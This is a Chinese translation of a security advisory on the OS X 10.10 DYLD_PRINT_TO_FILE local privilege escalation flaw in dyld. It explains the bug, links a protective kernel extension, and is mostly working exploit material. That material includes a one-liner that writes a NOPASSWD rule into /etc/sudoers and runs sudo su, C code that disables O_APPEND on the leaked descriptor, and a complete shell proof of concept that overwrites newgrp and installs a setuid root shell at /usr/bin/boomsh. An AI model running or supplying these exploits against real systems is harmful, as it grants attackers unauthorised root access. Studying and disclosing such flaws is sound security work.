# OS X 10.10 DYLD_PRINT_TO_FILE 本地权限提升漏洞

from:https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html

0x00 介绍
=====

随着`OS X 10.10`的发布，Apple已为其动态链接器添加了以下新特性。已添加用于将错误日志记录到任意文件的环境变量`DYLD_PRINT_TO_FILE`。 当该变量被添加到通常被需要的`safeguard`时，新的环境变量会被添加到未被使用的动态链接器。所以即使是suid为root的二进制程序也可能拥有这个新特性。因为在文件系统中可以打开或创建root用户拥有的任意文件。所以在这种情况下会有一定的危险性。此外，已打开的日志文件从不被关闭，因此它的文件描述符会被泄漏进SUID为root的进程。这意味着在文件系统中，SUID为root进程的子进程可以对具有root权限的用户所拥有的任意文件进行写操作。进而在`OS X 10.10.x`中实现权限提升。

这时，不管Apple是否了解到了该安全问题，在OS X 10.11中已修复了该漏洞，但在当前的OS X 10.10.4 的release版或当前OS X 10.10.5的测试版中未修复。 然而，我们已经发布了内核扩展的源码，它可以保护使用OS X 10.10.x的用户免受该安全漏洞的危害。源码下载地址：https://github.com/sektioneins/SUIDGuard

0x01 漏洞描述
=====

当Apple已经改变了用于OS X 10.10的动态链接器代码来支持新的环境变量`DYLD_PRINT_TO_FILE`时，他们已经将如下代码直接添加到了dyld的_main函数。正如你可以从该代码中所了解到的，该环境变量值被直接当作文件名来使用，其用于已打开或已创建的记录日志的文件。

```
const char* loggingPath = _simple_getenv(envp, "DYLD_PRINT_TO_FILE");
if ( loggingPath != NULL ) {
        int fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if ( fd != -1 ) {
                sLogfile = fd;
                sLogToFile = true;
        }
        else {
                dyld::log("dyld: could not open DYLD_PRINT_TO_FILE='%s', errno=%d\n", loggingPath, errno);
        }
}

```

问题在于，动态链接器应该拒绝所有被传递到其中的环境变量。当新的环境变量被添加到`processDyldEnvironmentVariable()`函数时，会实现自动化处理。然而在`DYLD_PRINT_TO_FILE`案例中，代码被直接添加到了`dyld`的`_main`函数。

由于此处的疏忽大意，`dyld`将接受`DYLD_PRINT_TO_FILE`，甚至是受限制的二进制程序 ，如SUID为root的二进制程序。这显然存在问题，因为在文件系统中，它允许对任意文件进行创建或打开操作。因为不被dyld打开的日志文件并且不打开在exec标志（通过SUID二进制程序的子进程继承的文件描述符）上为close的文件。可以非常容易地利用这个安全问题，进而实现权限提升。

在OS X10.11测试版中，Apple已经通过将DYLD_PRINT_TO_FILE (和另一个新的环境变量) 迁移到processDyldEnvironmentVariable()函数来对该漏洞进行修复。

0x02 测试
=====

如果系统存在漏洞或仅输入如下内容到shell中：

```
$ EDITOR=/usr/bin/true DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e

```

后来你的文件系统的root目录应该展示被创建的文件，其拥有root权限。

```
$ ls -la /
total 317
...
drwxr-xr-x@  2 root  wheel      68 Sep  9  2014 Network
drwxr-xr-x+  4 root  wheel     136 Jul 15 16:03 System
drwxr-xr-x   6 root  admin     204 Jul 17 17:39 Users
drwxrwxrwt@  4 root  admin     136 Jul 21 07:28 Volumes
drwxr-xr-x@ 39 root  wheel    1326 Jul 20 19:26 bin
drwxrwxr-t@  2 root  admin      68 Sep  9  2014 cores
dr-xr-xr-x   3 root  wheel    4156 Jul 20 20:26 dev
lrwxr-xr-x@  1 root  wheel      11 Jul 15 15:55 etc -> private/etc
dr-xr-xr-x   2 root  wheel       1 Jul 21 07:34 home
-rw-r--r--@  1 root  wheel     313 Apr 28 21:11 installer.failurerequests
dr-xr-xr-x   2 root  wheel       1 Jul 21 07:34 net
drwxr-xr-x@  6 root  wheel     204 Jul 15 16:08 private
drwxr-xr-x@ 61 root  wheel    2074 Jul 20 19:26 sbin
-rw-r--r--   1 root  wheel       0 Jul 21 17:22 this_system_is_vulnerable <----
lrwxr-xr-x@  1 root  wheel      11 Jul 15 15:56 tmp -> private/tmp

```

如果你可以看到该文件，那么该程序存在漏洞。

一句话测试：

```
echo python -c '"import os;os.write(3,\"ALL ALL=(ALL) NOPASSWD: ALL\")"'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su

```

0x03 保护
=====

在进行对该问题的利用前，因为Apple将花费数月来对该问题进行回顾，我们已发布了一个内核扩展，通过阻止所有SUID为root的二进制程序识别的环境变量来进行保护。此外它添加了缓解来解决在文件描述符上绕过的O_APPEND的限制。

你可以在Github中得到源码：https://github.com/sektioneins/SUIDGuard

Exploitation 1
--------------

因为其将已打开的文件描述符泄漏给我们执行的二进制程序的子进程。我们可以使用一些简短的shell命令行再次进行示范。 正如你可以看到的文件描述符3（与被打开的日志文件相关）被泄露进已弹出的shell并且可以直接被写入。不具有特权的用户已经将数据追加到了root用户拥有的文件。在文件系统上这可以是任意文件，这使权限提升变得相当容易。 笔记：在该范例中我们已使用了su（已经输入我们自己的密码），但是我们可以之前使用过的crontab技巧并将用于相同用途的恶意shell脚本放入EDITOR环境变量中。

Exploitation 2
--------------

到目前为止，我已示范将任意数据追加到文件系统的任意文件。确实挺糟糕的，但是到目前为止我们被O_APPEND 标志限制了。该标志阻碍我们覆写任意一个我们钟情的文件。这是存在的比所有人所相信还要小的问题，因为`O_APPEND`标志在文件描述符上可被进行`fcntl(F_SETFL)`系统调用的人关闭。如下c代码展示了如何将数据写入到任意文件。

```
int main(int argc, char **argv)
{
        int fd;
        char buffer[1024];

        /* disable O_APPEND */
        fcntl(3, F_SETFL, 0);
        lseek(3, 0, SEEK_SET);

        strcpy(buffer, "anything - anything - anything");

        write(3, &buffer, strlen(buffer));

```

Exploitation 3
--------------

当你可以在文件系统上将任意数据写到任意文件时，首先想到的显然是用自己的代码覆写任意SUID为root的二进制程序。可以在编写用于OS X系统调用的man页面上找到一些对你有帮助的信息。

使用该攻击来覆写SUID为root的二进制程序。但是你应该不再相信man页面的帮助信息，因为当你试图进行缓解后的Apple将不触发，日志文件被SUID为root的二进制程序打开，因此对文件系统的写操作将会信任通过超级用户执行的写操作并且SUID的位将不被清空。

完整的POC
------

如下代码为用于该安全问题的概念证明代码，其实用之前所讨论过的方法来为用户安装root shell，同时也会为了更容易地获得root权限而在目录`/usr/bin/boomsh`安装`root shell`。 请注意该段代码可能会危害系统，因为它会安装root shell。

```
#!/bin/sh
#
# Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE
# local privilege escalation vulnerability in OS X 10.10 - 10.10.4
#
# (C) Copyright 2015 Stefan Esser <stefan.esser@sektioneins.de>
#
# Wait months for a fix from Apple or install the following KEXT as protection
# https://github.com/sektioneins/SUIDGuard
#
# Use at your own risk. This copies files around with root permissions,
# overwrites them and deletes them afterwards. Any glitch could corrupt your
# system. So you have been warned.

SUIDVICTIM=/usr/bin/newgrp

# why even try to prevent a race condition?
TARGET=`pwd`/tmpXXXXX

rm -rf $TARGET
mkdir $TARGET

cat << EOF > $TARGET/boomsh.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
        setuid(0);
        setgid(0);
        system("/bin/bash -i");
        printf("done.\n");
        return 0;
}
EOF
cat << EOF > $TARGET/overwrite.c
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
        int fd;
        char buffer[1024];
        ssize_t toread, numread;
        ssize_t numwritten;
        ssize_t size;

        /* disable O_APPEND */
        fcntl(3, F_SETFL, 0);
        lseek(3, 0, SEEK_SET);

        /* write file into it */
        fd = open(
EOF
echo "\"$TARGET/boomsh\"" >> $TARGET/overwrite.c
cat << EOF >> $TARGET/overwrite.c
        , O_RDONLY, 0);
        if (fd > 0) {

                /* determine size */
                size = lseek(fd, 0, SEEK_END);
                lseek(fd, 0, SEEK_SET);

                while (size > 0) {
                        if (size > sizeof(buffer)) {
                                toread = sizeof(buffer);
                        } else {
                                toread = size;
                        }

                        numread = read(fd, &buffer, toread);
                        if (numread < toread) {
                                fprintf(stderr, "problem reading\n");
                                _exit(2);
                        }
                        numwritten = write(3, &buffer, numread);
                        if (numread != numwritten) {
                                fprintf(stderr, "problem writing\n");
                                _exit(2);
                        }

                        size -= numwritten;

                }

                fsync(3);
                close(fd);
        } else {
                fprintf(stderr, "Cannot open for reading\n");
        }

        return 0;
}
EOF

cp $SUIDVICTIM $TARGET/backup
gcc -o $TARGET/overwrite $TARGET/overwrite.c
gcc -o $TARGET/boomsh $TARGET/boomsh.c

EDITOR=$TARGET/overwrite DYLD_PRINT_TO_FILE=$SUIDVICTIM crontab -e 2> /dev/null
echo "cp $TARGET/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh " | $SUIDVICTIM > /dev/null 2> /dev/null
echo "cp $TARGET/backup $SUIDVICTIM" | /usr/bin/boomsh > /dev/null 2> /dev/null

rm -rf $TARGET

/usr/bin/boomsh
```